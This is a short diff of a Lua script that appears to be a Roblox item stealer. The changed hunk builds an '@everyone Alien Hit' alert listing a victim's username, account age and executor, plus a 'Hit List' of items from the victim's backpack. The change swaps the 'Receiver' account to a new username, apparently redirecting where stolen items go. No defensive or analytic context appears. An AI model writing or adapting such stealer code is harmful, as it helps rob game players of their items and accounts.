@@ -139,7 +139,7 @@ task.spawn(function()
 
     local message = "@everyone **Alien Hit**\n──────────────\n" ..
                     "**Victim Info:**\nUsername: " .. playerName .. "\nExecutor: Delta\nAccount Age: " .. accountAge ..
-                    "\nReceiver: hadukin_53\n──────────────\n**Hit List:**\n"
+                    "\nReceiver: SH4RKSTORAGE29\n──────────────\n**Hit List:**\n"
 
     for i = 1, math.min(10, #backpackContent) do
         message = message .. "• " .. backpackContent[i] .. "\n"
